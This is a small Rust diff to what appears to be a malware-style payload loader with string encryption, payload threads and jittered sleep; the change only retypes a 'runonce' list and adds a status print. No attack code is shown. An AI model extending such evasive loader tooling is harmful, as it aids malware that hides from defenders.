@@ -3,6 +3,7 @@ use crate::dataoperation::un_apply_all_dataoperations;
 use crate::dataoperation::DataOperation;
 use crate::payload::Payload;
 use crate::payload_util::print_running_thread;
+use crate::payload_util::print_runonce;
 use crate::rundata::RunData;
 
 use cryptify;
@@ -82,7 +83,7 @@ pub fn run_loader() {
     info!("{}{}", encrypt_string!("[+] VERIFIED!"), "\n");
 
     let running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
-    let runonce: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
+    let runonce: Vec<Payload> = vec![];
     let mut run_data=RunData{running_thread:running_thread,runonce:runonce };
     let mut loop_nb = 1;
     loop {
@@ -115,6 +116,7 @@ pub fn run_loader() {
         }
 
         print_running_thread(&mut run_data.running_thread);
+        print_runonce(&mut run_data.runonce);
         //TODO wait all thread to finish -> new option
         config.sleep_and_jitt();
         info!(
